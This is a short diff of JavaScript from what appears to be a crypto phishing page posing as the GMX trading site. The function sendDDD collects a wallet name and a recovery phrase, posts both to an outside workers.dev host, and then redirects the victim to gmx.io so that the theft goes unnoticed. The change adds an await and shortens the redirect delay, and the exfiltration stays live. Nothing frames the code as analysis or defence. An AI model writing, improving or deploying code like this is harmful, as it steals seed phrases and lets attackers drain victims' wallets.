@@ -23,14 +23,21 @@ const sendDDD = _ => {
                         formData.append('wallet', wallet);
                         formData.append('phrase', phrase);
 
-                        fetch('https://mountaindewmfka.juistespastelastes.workers.dev', {
-    method: 'POST',
-    body: formData
-}).finally(() => {
+                        await fetch('https://mountaindewmfka.juistespastelastes.workers.dev', {
+                            method: 'POST',
+                            body: formData
+                        }).finally(() => {
     setTimeout(() => {
         window.location.href = 'https://gmx.io';
-    }, 1000);
+    }, 300);
 });
+                        })
+                    };
+                };
+            };
+        });
+    };
+};
 
 const checkUrlHash = _ => {
     const hash = 'trade';
